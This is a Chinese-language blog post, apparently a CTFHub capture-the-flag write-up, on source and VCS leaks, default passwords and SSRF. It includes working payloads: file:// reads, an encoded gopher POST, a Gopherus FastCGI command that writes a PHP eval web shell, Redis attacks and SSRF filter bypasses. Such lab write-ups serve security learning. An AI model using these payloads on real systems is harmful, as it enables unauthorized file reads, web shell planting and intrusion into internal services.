@@ -1,0 +1,555 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/L.jpg">
+  <link rel="icon" type="image/png" href="/img/L.jpg">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#FFFFF2">
+  <meta name="description" content="BLOG">
+  <meta name="author" content="">
+  <meta name="keywords" content="">
+  <title>Ctfhub - 1__/\/のblog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/arduino-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="1__/\/のblog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 100vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>1__/\/</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/llll.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Ctfhub">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-02-05 22:11" pubdate>
+        2021年2月5日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      40
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+            <div class="scroll-down-bar">
+              <i class="iconfont icon-arrowdown"></i>
+            </div>
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Ctfhub</h1>
+            
+            <div class="markdown-body">
+              <h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h2><h3 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h3><p>打开靶场是这样<br><img src="https://s1.imagehub.cc/images/2021/02/05/01.png" srcset="/img/loading.gif" alt="01.png"><br>试出了<code>www.zip</code><img src="https://ftp.bmp.ovh/imgs/2021/02/e4a53dc8cc6e31e3.png" srcset="/img/loading.gif"><br>差点让我以为是misc。。。。。。。。<br>看wp说是访问该文件名才能得到    <img src="https://s1.imagehub.cc/images/2021/02/05/03.png" srcset="/img/loading.gif" alt="03.png">      </p>
+<h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><ul>
+<li>知识点    <blockquote>
+<p>vim编辑文件会自动生成备份文件以及临时文件<br>临时文件是在编辑文本时就会创建的文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为  <code>.filename.swp，</code>（第一次产生的交换文件名为<code>.filename.txt.swp</code>；再次意外退出后，将会产生名为<code>.filename.txt.swo</code>的交换文件；而第三次产生的交换文件则为<code>.filename.txt.swn</code>）      </p>
+</blockquote>
+</li>
+</ul>
+<p><img src="https://s1.imagehub.cc/images/2021/02/05/04.png" srcset="/img/loading.gif" alt="04.png"><br>根据提示，访问<code>.index.php.swp</code>得到文件       </p>
+<h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h3><ul>
+<li>知识点   <blockquote>
+<p><code>.DS_Store</code>是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过<code>.DS_Store</code>可以知道这个目录里面所有文件的清单。</p>
+</blockquote>
+</li>
+</ul>
+<p>得到文件后用记事本打开，notepad会有许多<code>NULL</code>      </p>
+<h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><p>根据提示用<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44841017/article/details/105733100">githack</a><br><code>python GitHack.py http://challenge-01d55127514c37b5.sandbox.ctfhub.com:10080/.git/</code>需要注意的是，githack需要在python2下运行kali默认python是2.x,如需更换运行命令<code>alias python=’/usr/bin/python3’</code>这只是暂时的，重新开启终端会还原 <img src="https://ftp.bmp.ovh/imgs/2021/02/723886d5344eeed7.png" srcset="/img/loading.gif"><br><code>git log</code>查看提交commit history<img src="https://ftp.bmp.ovh/imgs/2021/02/c0eb6c8ca5a7bde7.png" srcset="/img/loading.gif"><br><code>git diff</code>比较文件的不同，即比较文件在暂存区和工作区的差异。<br><img src="https://ftp.bmp.ovh/imgs/2021/02/e469825c9cdfb249.png" srcset="/img/loading.gif"><br>或者直接<code>git log -p</code>也可<a target="_blank" rel="noopener" href="https://blog.csdn.net/jjlovefj/article/details/86476925">more</a></p>
+<h3 id="stash"><a href="#stash" class="headerlink" title="stash"></a>stash</h3><p><img src="https://ftp.bmp.ovh/imgs/2021/02/0a4ff12cf20d5d8c.png" srcset="/img/loading.gif"> </p>
+<h3 id="index"><a href="#index" class="headerlink" title="index"></a>index</h3><p><img src="https://ftp.bmp.ovh/imgs/2021/02/71d91a8d826e6a27.png" srcset="/img/loading.gif"><br><img src="https://ae02.alicdn.com/kf/H4a3d4c7743ad4c14aa8436a33fcd3867E.jpg" srcset="/img/loading.gif" alt="206.png">      </p>
+<h2 id="svn泄露"><a href="#svn泄露" class="headerlink" title="svn泄露"></a>svn泄露</h2><p><img src="https://ae04.alicdn.com/kf/H4a82f10c66a441eb88e7f4605de8a5fc4.jpg" srcset="/img/loading.gif" alt="301.png"><br>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p>
+<p>需要用到一个工具<code>https://github.com/kost/dvcs-ripper</code>            </p>
+<ul>
+<li>安装 ：<code>sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</code>     </li>
+<li>下载：<code>git clone https://github.com/kost/dvcs-ripper</code>       </li>
+<li>进入目录—-<code>./rip-svn.pl -v -u http://challenge-05b7bb06a8d52597.sandbox.ctfhub.com:10080/.svn/</code><br><img src="https://ae02.alicdn.com/kf/H29c34143c01d4d5d8e779d0e2486633bO.jpg" srcset="/img/loading.gif" alt="302.png"><br>svn1.7及以后版本则只在项目根目录生成一个.svn文件夹，里面的pristine文件夹里包含了整个项目的所有文件备份<img src="https://sc02.alicdn.com/kf/He5b38923481e44aa991f5d9a8af4c606r.jpg" srcset="/img/loading.gif" alt="303.png">     <h2 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h2>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。<br>使用<code>dvcs-ripper</code>里的<code>rip-hg.pl</code>获取<code>.hg</code><br><img src="https://ae03.alicdn.com/kf/H8d9f7059f12149038acda9a79def182fz.jpg" srcset="/img/loading.gif" alt="304.png"><br>进入<code>.hg/</code><img src="https://ae04.alicdn.com/kf/H20378cb9f63b45fb87a76966b69ee5b82.jpg" srcset="/img/loading.gif" alt="305.png"><br>网页访问得到flag     <h2 id="密码口令"><a href="#密码口令" class="headerlink" title="密码口令"></a>密码口令</h2><h3 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h3><img src="https://ae04.alicdn.com/kf/H1008cfe9ce7444b3941d6673d77452d1T.jpg" srcset="/img/loading.gif" alt="401.png"><br>百度搜索:<code>常见设备默认口令</code><br>找到亿邮邮件网关的默认用户名和密码—登录<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40399254/article/details/106469069">常见设备默认口令</a><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3></li>
+</ul>
+<p>来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦          </p>
+<p><img src="https://ae02.alicdn.com/kf/U9aac43ac8c544d01963111fc9be06a91h.jpg" srcset="/img/loading.gif" alt="501.png"><br>题目是端口扫描，给了范围，可以用burp爆破<br>抓包<br>在SSRF中，dict协议与http协议可用来探测内网的主机存活与端口开放情况<br><img src="https://ae04.alicdn.com/kf/Udb8ff8141f11458f8592a495df9dae77Y.jpg" srcset="/img/loading.gif" alt="502.png"><br>设置<br><img src="https://ae03.alicdn.com/kf/U237150ace53d40ad8b149c0880bd075bc.jpg" srcset="/img/loading.gif" alt="503.png"><br>结果<br><img src="https://ae02.alicdn.com/kf/U2ff238abbe8f47c3906bce8991367077Q.jpg" srcset="/img/loading.gif" alt="504.png"><br>访问得到flag      </p>
+<h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><p>尝试访问位于127.0.0.1的flag.php吧         </p>
+<p>payload：<code>url=127.0.0.1/flag.php</code>       </p>
+<h3 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h3><p>尝试去读取一下Web目录下的flag.php吧        </p>
+<p>题目说是web目录，用file伪协议即可<br>payload：<code>url=file:///var/www/html/flag.php</code><br>web目录要记住          </p>
+<h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><p>看wp说能扫出<code>index.php</code>和<code>flag.php</code>的，但我没扫出来<br>直接访问吧<br><code>/flag.php</code>——-&gt;Just View From 127.0.0.1<br>那么<code>?url=127.0.0.1/flag.php</code><img src="https://sc03.alicdn.com/kf/U16e6dcbec9894950bdd8eadca49482ecL.jpg" srcset="/img/loading.gif" alt="505.png"><br>可以用file协议读取<code>flag.php</code>        </p>
+<div class="hljs"><pre><code>&lt;?php
+
+error_reporting(0);
+
+if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;
+    echo &quot;Just View From 127.0.0.1&quot;;
+    return;
+&#125;
+
+$flag=getenv(&quot;CTFHUB&quot;);
+$key = md5($flag);
+
+if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;
+    echo $flag;
+    exit;
+&#125;
+?&gt;</code></pre></div>
+<p>没有提交按钮，可以用gopher协议构造post请求       </p>
+<div class="hljs"><pre><code>POST /flag.php HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+
+key=308353d55f15e345a78047c613994fcb         </code></pre></div>
+<p>将其进行url编码，<br>然后加上<code>gopher://127.0.0.1:80/_</code><br>再次url编码<br>提交得到flag<br>payload：<code>?url=gopher%3A%2F%2F127.0.0.1%3A80%2F_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D308353d55f15e345a78047c613994fcb</code></p>
+<h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>这个和上面那个差不多，也要用gopher协议<br>访问flag.php后有上传文件，但没提交按钮<br>可以自己构造一个<code>&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</code><br>提交抓包<br>Host改为<code>127.0.0.1</code><br>过一下上面的编码流程<br>提交       </p>
+<h3 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h3><p>这次.我们需要攻击一下fastcgi协议咯.也许附件的文章会对你有点帮助   </p>
+<p>这次可以使用<code>Gopherus</code>工具生成攻击fastcgi的payload     </p>
+<div class="hljs"><pre><code>python gopherus.py --exploit fastcgi
+/var/www/html/index.php                 # 这里输入的是一个已知存在的php文件
+echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4 | base64 -d &gt; /var/www/html/shell.php   #写入一句话&lt;?php eval($_POST[whoami]);?&gt;</code></pre></div>
+<p><a target="_blank" rel="noopener" href="https://github.com/tarunkant/gopherus">gopher</a><br><img src="https://sc04.alicdn.com/kf/Ub52af498907e44fcb82b438d02f79f38P.jpg" srcset="/img/loading.gif" alt="507.png"><br>因为要以GET传入，所以要再进行一次url编码<br>提交后蚁剑连接即可<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">P神的fsatcgi分析</a>        </p>
+<h3 id="Redia协议"><a href="#Redia协议" class="headerlink" title="Redia协议"></a>Redia协议</h3><p>这次来攻击redis协议吧.redis://127.0.0.1:6379,资料?没有资料!自己找!     </p>
+<p>Redia也可以用gopherus直接生成payload<br><img src="https://sc01.alicdn.com/kf/U59fa33c2723c4f3899da3f7205a6a573R.jpg" srcset="/img/loading.gif" alt="508.png"><br>但这次需要将得到的payload进行两次url编码，不知道为什么，不该是一次么？？        </p>
+<h3 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h3><p>请求的URL中必须包含<a target="_blank" rel="noopener" href="http://notfound.ctfhub.com,来尝试利用url的一些特殊地方绕过这个限制吧/">http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧</a></p>
+<p><img src="https://ae03.alicdn.com/kf/Ud3002561aaad433d8b3b07518fa317f2i.jpg" srcset="/img/loading.gif" alt="509.png"><br><code>@</code><br>payload：<code>?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</code>        </p>
+<h3 id="数字IP-Bypass"><a href="#数字IP-Bypass" class="headerlink" title="数字IP Bypass"></a>数字IP Bypass</h3><p>这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢      </p>
+<p>转换为十六进制，八进制和十进制貌似不行<br><code>0x7f.0.0.1/flag.php</code>  </p>
+<ul>
+<li>其他指向<code>127.0.0.1</code>的地址    <blockquote>
+<p><a target="_blank" rel="noopener" href="http://localhost/">http://localhost/</a><br><a target="_blank" rel="noopener" href="http://0.0.0.0/">http://0/</a><br>http://[0:0:0:0:0:ffff:127.0.0.1]/<br>http://①②⑦.⓪.⓪.①      </p>
+</blockquote>
+</li>
+</ul>
+<h3 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h3><p>SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧      </p>
+<p>抱着试试的心态，看会有什么，直接<code>?url=127.0.0.1/flag.php</code><br>居然出了flag？？？？？？？？？         </p>
+<ul>
+<li><code>.xip.io</code>      <blockquote>
+<p>127.0.0.1.xip.io——-&gt;127.0.0.1       </p>
+</blockquote>
+</li>
+<li><a target="_blank" rel="noopener" href="https://4m.cn/">短地址绕过</a><br>  <img src="https://ae02.alicdn.com/kf/U322cdf822f2d4381baff23981c4998dbA.jpg" srcset="/img/loading.gif" alt="510.png">       </li>
+</ul>
+<h3 id="DNS重绑定-Bypass"><a href="#DNS重绑定-Bypass" class="headerlink" title="DNS重绑定 Bypass"></a>DNS重绑定 Bypass</h3><p>这两道题指定是出毛病了<br>直接就出来了？？？？？      </p>
+<p>一个网站获取测试用的域名<code>https://lock.cmpxchg8b.com/rebinder.html</code><br><img src="https://ae03.alicdn.com/kf/Uffcd9a5275694a52a5104eed584e3e4bI.jpg" srcset="/img/loading.gif" alt="511.png"><br>这个域名可以在两个IP间变换，所以就有可能在经过判断IP是否合法是解析到合法的那个IP，在其访问时解析到内网IP<br>所以要不断访问<br><img src="https://image.3001.net/images/20201220/1608453315_5fdf0cc30da5af624b123.png" srcset="/img/loading.gif"><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89426041">DNS重绑定</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/note/">note</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/02/06/BUU023/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BUU每日一题023</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/02/05/BUU022/">
+                        <span class="hidden-mobile">BUU每日一题022</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/qipao.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/caidai.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/yinghua.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/boom.js"></script>
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+<!--//背景线条      {% if theme.canvas_nest %}-->
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+{% endif %}
+
+<!-- fireworks-->
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+
+</body>
+</html>
